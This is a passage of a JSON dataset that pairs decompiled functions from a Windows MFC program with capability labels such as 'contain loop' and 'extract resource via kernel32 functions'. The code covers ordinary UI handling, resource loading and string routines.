        "decompiled_code": "\nvoid fcn.00443412(uint param_1, int32_t param_2, uint param_3, uint param_4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t noname_1;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint noname_4;\n    int32_t noname_5;\n    \n    if (param_2 != 0) {\n        noname_4 = *(param_2 + 0x20);\n        uVar1 = (*_sym.imp.USER32.dll_GetWindowLongA)(noname_4, 0xffffffec);\n        if ((uVar1 & 0x10000) == 0) {\n            iVar2 = fcn.00443157();\n            noname_5 = param_2;\n            goto code_r0x00443447;\n        }\n    }\n    noname_5 = 3;\n    noname_4 = 0;\n    iVar2 = fcn.004431ac(param_1, 0, 3, unaff_EDI, unaff_ESI, unaff_retaddr, param_1, param_2, param_3, param_4);\ncode_r0x00443447:\n    noname_1 = iVar2;\n    if (iVar2 != 0) {\n        do {\n            fcn.004433c5(noname_1, 0);\n            noname_1 = fcn.004431ac(unaff_EDI, noname_1, 0, unaff_EDI, noname_4, noname_5, unaff_EDI, unaff_ESI, \n                                    unaff_retaddr, param_1);\n            if (noname_1 == 0) {\n                return;\n            }\n        } while (noname_1 != iVar2);\n    }\n    return;\n}\n",
        "token_count": 411
    },
    "00444aa1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444aa1(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_10h;\n    int32_t unaff_EBX;\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = 0;\n    if ((arg_ch != 0) && (unaff_EBX = arg_8h,  -1 < arg_8h)) {\n        if (*(arg_ch + 8) < 1) {\n            return;\n        }\n        arg_10h = *(arg_ch + 8);\n        if (0 < arg_10h) goto code_r0x00444acc;\n    }\n    arg_10h = fcn.0041901a();\n    arg_8h = unaff_EBX;\ncode_r0x00444acc:\n    fcn.004449d1(arg_8h, **(arg_ch + 4), arg_10h);\n    if (0 < *(arg_ch + 8)) {\n        do {\n            fcn.00444780(iVar1);\n            fcn.0044479c();\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < *(arg_ch + 8));\n    }\n    return;\n}\n",
        "token_count": 275
    },
    "00444ee8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444ee8(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_10h;\n    int32_t unaff_EBX;\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = 0;\n    if ((arg_ch != 0) && (unaff_EBX = arg_8h,  -1 < arg_8h)) {\n        if (*(arg_ch + 8) < 1) {\n            return;\n        }\n        arg_10h = *(arg_ch + 8);\n        if (0 < arg_10h) goto code_r0x00444f13;\n    }\n    arg_10h = fcn.0041901a();\n    arg_8h = unaff_EBX;\ncode_r0x00444f13:\n    fcn.00444df0(arg_8h, **(arg_ch + 4), arg_10h);\n    if (0 < *(arg_ch + 8)) {\n        do {\n            fcn.00435df3(iVar1);\n            fcn.00435e0f();\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < *(arg_ch + 8));\n    }\n    return;\n}\n",
        "token_count": 279
    },
    "0044569f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0044569f(int32_t param_1, int32_t param_2)\n\n{\n    do {\n        if (param_1 == param_2) {\n            return 1;\n        }\n        param_2 = fcn.0041ff61();\n    } while (param_2 != 0);\n    return 0;\n}\n",
        "token_count": 76
    },
    "00447f7c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00447f7c(void)\n\n{\n    int32_t iVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CFrameWnd.0;\n    *(unaff_EBP + -4) = 2;\n    fcn.00447b64();\n    iVar1 = fcn.0042b206();\n    while (*(iVar1 + 0xec) == extraout_ECX) {\n        fcn.00445e19();\n    }\n    if (extraout_ECX[0x2f] != NULL) {\n        fcn.004170df(extraout_ECX[0x2f]);\n    }\n    fcn.004010d0();\n    *(unaff_EBP + -4) = 0;\n    fcn.00432473();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041f0ac();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 281
    },
    "004481cd": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.004481cd(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code **ppcVar8;\n    int32_t *piVar9;\n    uint *puVar10;\n    int32_t **ppiVar11;\n    uint extraout_ECX;\n    uint32_t uVar12;\n    int32_t unaff_EBP;\n    uint32_t uVar13;\n    uint *in_FS_OFFSET;\n    uint32_t uVar14;\n    \n    fcn.00458e45(0xf4);\n    *(unaff_EBP + 0x60) = extraout_ECX;\n    uVar4 = fcn.00423280();\n    fcn.00401680(uVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n    *(unaff_EBP + -4) = 0;\n    iVar5 = (*pcVar2)(\"ReBarWindow32\");\n    uVar4 = fcn.00401940(iVar5 + 1);\n    puVar10 = *(unaff_EBP + 0x74);\n    (*_sym.imp.USER32.dll_GetClassNameA)(*puVar10, uVar4, iVar5 + 1);\n    fcn.00410110(0xffffffff);\n    uVar4 = fcn.0041e6a5(*puVar10);\n    *(unaff_EBP + 0x74) = uVar4;\n    iVar5 = fcn.004039d0(\"ReBarWindow32\");\n    if ((iVar5 == 0) && (iVar5 = *(unaff_EBP + 0x74),  iVar5 != 0)) {\n        iVar6 = fcn.004306e6(0x490d98);\n        if (iVar6 != 0) {\n            iVar6 = fcn.0041f1fc();\n            if ((iVar6 != 0) && (*(unaff_EBP + 0x60) != iVar6)) {\n                uVar4 = fcn.004481cd(*(unaff_EBP + 0x70), puVar10, *(unaff_EBP + 0x78));\n                goto code_r0x00448280;\n            }\n            fcn.0042ba94();\n            *(unaff_EBP + -4) = 1;\n            uVar4 = fcn.00423280();\n            fcn.00401680(uVar4);\n            *(unaff_EBP + -4) = 2;\n            uVar4 = fcn.00423280();\n            fcn.00401680(uVar4);\n            *(unaff_EBP + -4) = 3;\n            fcn.00419a58();\n            *(unaff_EBP + -4) = 4;\n            fcn.0041a31b(*(unaff_EBP + 0x60));\n            pcVar3 = _sym.imp.USER32.dll_SendMessageA;\n            uVar4 = puVar10[3];\n            uVar1 = *(iVar5 + 0x20);\n            *(unaff_EBP + -4) = 5;\n            *(unaff_EBP + -0x100) = 0x50;\n            *(unaff_EBP + -0xfc) = 0x10;\n            (*pcVar3)(uVar1, 0x41d, uVar4, unaff_EBP + -0x100);\n            (*pcVar3)(*(*(unaff_EBP + 0x74) + 0x20), 0x409, puVar10[3], unaff_EBP + -0x1c);\n            iVar5 = (*pcVar2)(\"ToolbarWindow32\");\n            uVar4 = fcn.00401940(iVar5 + 1);\n            (*_sym.imp.USER32.dll_GetClassNameA)(*(unaff_EBP + -0xe0), uVar4, iVar5 + 1);\n            fcn.00410110(0xffffffff);\n            iVar5 = fcn.0041e6a5(*(unaff_EBP + -0xe0));\n            *(unaff_EBP + 0x20) = iVar5;\n            iVar6 = fcn.004039d0();\n            if ((iVar6 == 0) && (iVar5 != 0)) {\n                iVar6 = fcn.004306e6(0x490a44);\n                if (iVar6 != 0) {\n                    *(unaff_EBP + -0x14) = puVar10[6];\n                    *(unaff_EBP + 0x24) = puVar10 + 6;\n                    fcn.00419edd(unaff_EBP + -0x1c);\n                    fcn.00419ea1(unaff_EBP + -0x1c);\n                    iVar6 = fcn.00445e3e();\n                    *(unaff_EBP + 0x58) = iVar6;\n                    do {\n                        iVar6 = iVar6 + -1;\n                        uVar4 = *(iVar5 + 0x20);\n                        *(unaff_EBP + 0x74) = iVar6;\n                        (*pcVar3)(uVar4, 0x41d, iVar6, unaff_EBP + -0x80);\n                        iVar7 = (*_sym.imp.USER32.dll_IntersectRect)\n                                          (unaff_EBP + -0x90, unaff_EBP + -0x1c, unaff_EBP + -0x80);\n                        if (iVar7 != 0) break;\n                    } while (iVar6 != 0);\n                    fcn.00459330(unaff_EBP + -0x70, 0, 0x30);\n                    *(unaff_EBP + -0x70) = 0x30;\n                    iVar5 = fcn.00445e6a();\n                    fcn.0044b8e6();\n                    *(unaff_EBP + 0x3c) = vtable.CTypedPtrArray_class_CObArray__class_CBitmap__.0;\n                    uVar14 = *(unaff_EBP + 0x74);\n                    *(unaff_EBP + -4) = 6;\n                    fcn.0044b90d(*(unaff_EBP + 0x58) - uVar14, 0xffffffff);\n                    uVar4 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n                    fcn.0042b9ca(uVar4);\n                    fcn.0040f270(unaff_EBP + -0x30);\n                    uVar12 = 0;\n                    if (uVar14 < *(unaff_EBP + 0x58)) {\n                        do {\n                            fcn.0044d66a(*(unaff_EBP + 0x74), unaff_EBP + 0x54, unaff_EBP + 0x38, unaff_EBP + 0x50);\n                            if ((*(unaff_EBP + 0x38) & 1) == 0) {\n                                *(unaff_EBP + -0x6c) = 0x162;\n                                fcn.00402ed0(*(unaff_EBP + 0x54));\n                                fcn.00424235(unaff_EBP + 0x5c, *(unaff_EBP + 0x70), 1, 10);\n                                ppcVar8 = fcn.004170b4(8);\n                                if (ppcVar8 == NULL) {\n                                    ppcVar8 = NULL;\n                                }\n                                else {\n                                    ppcVar8[1] = NULL;\n                                    *ppcVar8 = vtable.CBitmap.0;\n                                }\n                                fcn.0044baec(uVar12, ppcVar8);\n                                fcn.004477cc(*(iVar5 + 4), *(unaff_EBP + 0x50), unaff_EBP + -0xb0);\n                                (*_sym.imp.USER32.dll_CopyRect)(unaff_EBP + 0x10, unaff_EBP + -0xa0);\n                                (*_sym.imp.USER32.dll_OffsetRect)\n                                          (unaff_EBP + 0x10, -*(unaff_EBP + 0x10), -*(unaff_EBP + 0x14));\n                                fcn.00445c99(uVar12);\n                                fcn.00445ce2(unaff_EBP + -0x30, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c));\n                                piVar9 = fcn.00445c99(uVar12);\n                                iVar6 = *piVar9;\n                                if (iVar6 != 0) {\n                                    iVar6 = *(iVar6 + 4);\n                                }\n                                uVar4 = fcn.0041a64f(*(unaff_EBP + 0x2c), iVar6);\n                                puVar10 = fcn.00445c99(uVar12);\n                                *puVar10 = uVar4;\n                                uVar4 = (*_sym.imp.USER32.dll_GetSysColor)(4);\n                                fcn.0042e887(unaff_EBP + 0x10, uVar4);\n                                fcn.004477ea(unaff_EBP + 0x28, *(unaff_EBP + 0x50), 0, 0, 1);\n                                piVar9 = fcn.00445c99(uVar12);\n                                iVar6 = *piVar9;\n                                if (iVar6 != 0) {\n                                    iVar6 = *(iVar6 + 4);\n                                }\n                                uVar4 = fcn.0041a64f(*(unaff_EBP + 0x2c), iVar6);\n                                puVar10 = fcn.00445c99(uVar12);\n                                *puVar10 = uVar4;\n                                *(unaff_EBP + -0x4c) = *(unaff_EBP + 0x5c);\n                                *(unaff_EBP + -0x60) = *(unaff_EBP + 0x54);\n                                *(unaff_EBP + -0x68) = 0x100;\n                                puVar10 = fcn.00445c99(uVar12);\n                                *(unaff_EBP + -0x50) = *puVar10;\n                                uVar12 = uVar12 + 1;\ncode_r0x004485ce:\n                                (*_sym.imp.USER32.dll_InsertMenuItemA)\n                                          (*(unaff_EBP + 4), *(unaff_EBP + 0x74), 1, unaff_EBP + -0x70);\n                            }\n                            else if (uVar12 != 0) {\n                                *(unaff_EBP + -0x6c) = 0x100;\n                                *(unaff_EBP + -0x68) = 0x800;\n                                goto code_r0x004485ce;\n                            }\n                            *(unaff_EBP + 0x74) = *(unaff_EBP + 0x74) + 1;\n                        } while (*(unaff_EBP + 0x74) < *(unaff_EBP + 0x58));\n                    }\n                    (*_sym.imp.USER32.dll_CopyRect)(unaff_EBP + -0x40, *(unaff_EBP + 0x24));\n                    fcn.00419edd(unaff_EBP + -0x40);\n                    uVar13 = 0;\n                    uVar14 = 0;\n                    fcn.0041d0a2(0, *(unaff_EBP + -0x40), *(unaff_EBP + -0x34), *(unaff_EBP + 0x60), 0);\n                    **(unaff_EBP + 0x78) = 0;\n                    if (uVar12 != 0) {\n                        do {\n                            uVar14 = uVar13;\n                            ppiVar11 = fcn.00445c99();\n                            if (*ppiVar11 != NULL) {\n                                (**(**ppiVar11 + 4))(1);\n                            }\n                            uVar13 = uVar13 + 1;\n                        } while (uVar13 < uVar12);\n                    }\n                    *(unaff_EBP + -4) = 5;\n                    fcn.0044b8fd(uVar14);\n                    *(unaff_EBP + -4) = 4;\n                    fcn.0041a36f();\n                    *(unaff_EBP + -4) = 3;\n                    fcn.0041a302();\n                    fcn.004010d0();\n                    fcn.004010d0();\n                    *(unaff_EBP + -4) = 0;\n                    fcn.0042bafb();\n                    uVar4 = 1;\n                    goto code_r0x00448280;\n                }\n            }\n            *(unaff_EBP + -4) = 4;\n            fcn.0041a36f();\n            *(unaff_EBP + -4) = 3;\n            fcn.0041a302();\n            fcn.004010d0();\n            fcn.004010d0();\n            *(unaff_EBP + -4) = 0;\n            fcn.0042bafb();\n        }\n    }\n    uVar4 = 0;\ncode_r0x00448280:\n    fcn.004010d0();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar4;\n}\n",
        "token_count": 2925
    },
    "004489d4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004489d4(uint lpFileTime, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_ECX;\n    uint lpSystemTime;\n    uint lpLocalFileTime;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_FileTimeToLocalFileTime)(lpFileTime, &lpLocalFileTime);\n    if (iVar1 != 0) goto code_r0x004489ff;\n    do {\n        *in_ECX = 0;\n        in_ECX[1] = 0;\n        lpFileTime = 0x80070057;\n        fcn.00401070();\ncode_r0x004489ff:\n        iVar1 = (*_sym.imp.KERNEL32.dll_FileTimeToSystemTime)(&lpLocalFileTime, &lpSystemTime, lpFileTime);\n    } while (iVar1 == 0);\n    fcn.0042d20f(&lpSystemTime, arg_ch);\n    *in_ECX = var_8h;\n    in_ECX[1] = var_4h;\n    return;\n}\n",
        "token_count": 248
    },
    "0044bc14": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044bc14(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_10h;\n    int32_t unaff_EBX;\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = 0;\n    if ((arg_ch != 0) && (unaff_EBX = arg_8h,  -1 < arg_8h)) {\n        if (*(arg_ch + 8) < 1) {\n            return;\n        }\n        arg_10h = *(arg_ch + 8);\n        if (0 < arg_10h) goto code_r0x0044bc3f;\n    }\n    arg_10h = fcn.0041901a();\n    arg_8h = unaff_EBX;\ncode_r0x0044bc3f:\n    fcn.0044bb1c(arg_8h, **(arg_ch + 4), arg_10h);\n    if (0 < *(arg_ch + 8)) {\n        do {\n            fcn.0044b87e(iVar1);\n            fcn.0044b89a();\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < *(arg_ch + 8));\n    }\n    return;\n}\n",
        "token_count": 283
    },
    "0044c061": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0044c061(int32_t param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t unaff_retaddr;\n    \n    iVar2 = 0;\n    if (0 < *(param_1 + 0xa0)) {\n        do {\n            if ((iVar2 != param_3) && (piVar1 = fcn.0044be6c(iVar2),  *piVar1 == unaff_retaddr)) {\n                return iVar2;\n            }\n            iVar2 = iVar2 + 1;\n        } while (iVar2 < *(param_1 + 0xa0));\n    }\n    return -1;\n}\n",
        "token_count": 168
    },
    "0044c3ac": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0044c3ac(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = 0;\n    iVar3 = 0;\n    if (0 < *(param_1 + 0xa0)) {\n        do {\n            iVar1 = fcn.0044c09e();\n            if (iVar1 != 0) {\n                iVar2 = iVar2 + 1;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < *(param_1 + 0xa0));\n    }\n    return iVar2;\n}\n",
        "token_count": 147
    },
    "0044ca98": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044ca98(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint unaff_retaddr;\n    \n    iVar1 = 0;\n    if (0 < *(param_1 + 0xa0)) {\n        do {\n            arg_8h = fcn.0044c09e(iVar1);\n            if (arg_8h != 0) {\n                fcn.004459bd();\n                fcn.00446981(arg_8h, unaff_retaddr, 1);\n            }\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < *(param_1 + 0xa0));\n    }\n    return;\n}\n",
        "token_count": 162
    },
    "00450053": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00450053(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0042b7b9();\n    fcn.004320fb(0);\n    for (iVar1 = *(iVar1 + 0x24); iVar1 != 0; iVar1 = *(iVar1 + 0x20)) {\n        fcn.0044fb39();\n    }\n    fcn.00432168(0);\n    return;\n}\n",
        "token_count": 102
    },
    "0045336d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045336d(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint lpMsg;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetCapture;\n    iVar2 = (*_sym.imp.USER32.dll_GetCapture)();\n    if (iVar2 == 0) {\n        uVar3 = (*_sym.imp.USER32.dll_SetCapture)(*(*(param_1 + 0x68) + 0x20));\n        fcn.0041e67e(uVar3);\n        uVar3 = (*pcVar1)();\n        iVar2 = fcn.0041e67e(uVar3);\n        if (iVar2 == *(param_1 + 0x68)) {\n            do {\n                uVar4 = 0;\n                uVar3 = 0;\n                iVar2 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n                if (iVar2 == 0) {\n                    fcn.004247b8(uVar4, var_14h);\n                    break;\n                }\n                if (var_18h == 0x100) {\n                    if (*(param_1 + 0x88) != 0) {\n                        fcn.00453038(uVar3, 1, var_14h);\n                    }\n                    if (var_14h == 0x1b) break;\n                }\n                else if (var_18h == 0x101) {\n                    if (*(param_1 + 0x88) != 0) {\n                        fcn.00453038(uVar3, 0, var_14h);\n                    }\n                }\n                else if (var_18h == 0x200) {\n                    if (*(param_1 + 0x88) == 0) {\n                        fcn.0045306c(var_8h, var_4h);\n                    }\n                    else {\n                        fcn.00452fbc(var_8h, var_4h);\n                    }\n                }\n                else {\n                    if (var_18h == 0x202) {\n                        if (*(param_1 + 0x88) == 0) {\n                            fcn.00453329();\n                        }\n                        else {\n                            fcn.00453225();\n                        }\n                        return 1;\n                    }\n                    if (var_18h == 0x204) break;\n                    (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n                }\n                uVar3 = (*pcVar1)();\n                iVar2 = fcn.0041e67e(uVar3);\n            } while (iVar2 == *(param_1 + 0x68));\n        }\n        fcn.004531e0();\n    }\n    return 0;\n}\n",
        "token_count": 649
    },
    "00453b13": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453b13(code **param_1)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint uStack24;\n    code *pcStack20;\n    \n    *param_1 = vtable.CMapStringToPtr.0;\n    if (param_1[1] != NULL) {\n        pcVar1 = NULL;\n        if (param_1[2] != NULL) {\n            do {\n                for (puVar2 = *(param_1[1] + pcVar1 * 4); puVar2 != NULL; puVar2 = *puVar2) {\n                    if (puVar2 == 0xfffffff8) {\n                        pcStack20 = NULL;\n                        uStack24 = 0x4a8690;\n                        fcn.00456b8d(&uStack24, 0x49ed44);\n                        pcVar1 = swi(3);\n                        (*pcVar1)();\n                        return;\n                    }\n                    uStack24 = 0x453ae0;\n                    fcn.00423c17();\n                }\n                pcVar1 = pcVar1 + 1;\n            } while (pcVar1 < param_1[2]);\n        }\n        pcStack20 = param_1[1];\n        uStack24 = 0x453af4;\n        fcn.004170df();\n        param_1[1] = NULL;\n    }\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    pcStack20 = 0x453b06;\n    fcn.00436366();\n    param_1[5] = NULL;\n    return;\n}\n",
        "token_count": 360
    },
    "00453cf6": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453cf6(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < param_1[1]) {\n        do {\n            fcn.0045839d(*(*param_1 + iVar1 * 4));\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < param_1[1]);\n    }\n    fcn.004170df(*param_1);\n    return;\n}\n",
        "token_count": 111
    },
    "00455b4c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00455b4c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_1 == 0) {\n        fcn.0041901a();\n    }\n    if (param_2 == 0) {\n        iVar1 = 0;\n        do {\n            if ((*(iVar1 * 8 + 0x4920bc) & 0xf000) == (*(param_1 + 0x80) & 0xf000)) {\n                iVar1 = fcn.00446d8a(*(iVar1 * 8 + 0x4920b8));\n                if (iVar1 != 0) goto code_r0x00455b9d;\n                break;\n            }\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < 4);\n        fcn.0041901a();\n    }\ncode_r0x00455b9d:\n    fcn.0044cba6(param_1, param_2);\n    return;\n}\n",
        "token_count": 230
    },
    "00460389": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00460389(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00459460(0x4a4a10, 0xc);\n    fcn.00466299(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x4ad5ac;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x4ad5a8;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x004603cd;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.0045839d(arg_8h_00);\ncode_r0x004603cd:\n        fcn.0045839d(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004603f0();\n    fcn.004594a5();\n    return;\n}\n",
        "token_count": 397
    },
    "004604ee": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004604ee(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00459460(0x4a4a50, 0xc);\n    fcn.00466299(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x4ad5ac;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x4ad5a8;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x00460532;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.0045839d(arg_8h_00);\ncode_r0x00460532:\n        fcn.0045839d(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00460555();\n    fcn.004594a5();\n    return;\n}\n",
        "token_count": 396
    },
    "00469680": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t * fcn.00469680(uint32_t *param_1, char param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    uVar1 = param_1 & 3;\n    while (uVar1 != 0) {\n        if (*param_1 == param_2) {\n            return param_1;\n        }\n        if (*param_1 == '\\0') {\n            return NULL;\n        }\n        uVar1 = param_1 + 1 & 3;\n        param_1 = param_1 + 1;\n    }\n    while( true ) {\n        while( true ) {\n            uVar1 = *param_1;\n            uVar4 = uVar1 ^ CONCAT22(CONCAT11(param_2, param_2), CONCAT11(param_2, param_2));\n            uVar3 = uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff;\n            puVar5 = param_1 + 1;\n            if (((uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff) & 0x81010100) != 0) break;\n            param_1 = puVar5;\n            if ((uVar3 & 0x81010100) != 0) {\n                if ((uVar3 & 0x1010100) != 0) {\n                    return NULL;\n                }\n                if ((uVar1 + 0x7efefeff & 0x80000000) == 0) {\n                    return NULL;\n                }\n            }\n        }\n        uVar1 = *param_1;\n        if (uVar1 == param_2) {\n            return param_1;\n        }\n        if (uVar1 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 8;\n        if (cVar2 == param_2) {\n            return param_1 + 1;\n        }\n        if (cVar2 == '\\0') break;\n        cVar2 = uVar1 >> 0x10;\n        if (cVar2 == param_2) {\n            return param_1 + 2;\n        }\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 0x18;\n        if (cVar2 == param_2) {\n            return param_1 + 3;\n        }\n        param_1 = puVar5;\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 590
    },
    "0048141e": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0048141e(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar5 = in_ECX + 0x18;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(iVar5);\n    iVar4 = 0;\n    if (0 < *(in_ECX + 0x34)) {\n        do {\n            iVar5 = iVar4;\n            piVar1 = fcn.004812cf();\n            if (*piVar1 == arg_8h) {\n                fcn.0048128c();\n                uVar3 = 1;\n                goto code_r0x00481466;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < *(in_ECX + 0x34));\n    }\n    iVar4 = iVar5;\n    uVar3 = 0;\ncode_r0x00481466:\n    uVar2 = fcn.004813cf(iVar4);\n    return uVar2 & 0xffffff00 | uVar3;\n}\n",
        "token_count": 282
    },
    "00421c37": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nuint fcn.00421c37(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    arg_8h = 0;\n    if (param_1 != 0) {\n        iVar1 = fcn.0042b7b9();\n        uVar2 = *(iVar1 + 0xc);\n        iVar1 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar2, param_1, 0xf0);\n        if (iVar1 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar2, iVar1);\n            if (iVar3 == 0) {\n                return 0;\n            }\n            arg_8h = (*_sym.imp.KERNEL32.dll_LockResource)(iVar3);\n        }\n    }\n    uVar2 = fcn.004217ee(arg_8h);\n    if ((arg_8h != 0) && (iVar3 != 0)) {\n        (*_sym.imp.KERNEL32.dll_FreeResource)(iVar3);\n    }\n    return uVar2;\n}\n",
        "token_count": 264
    },
    "00427320": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00427320(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_8h_00 = 0;\n    iVar1 = fcn.0042b7b9();\n    uVar3 = *(iVar1 + 0xc);\n    uVar2 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar3, arg_8h, 5);\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar3, uVar2);\n    if (iVar1 != 0) {\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar1);\n    }\n    uVar3 = fcn.00426f42(arg_8h_00, arg_ch, uVar3);\n    (*_sym.imp.KERNEL32.dll_FreeResource)(iVar1);\n    return uVar3;\n}\n",
        "token_count": 230
    },
    "00427376": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
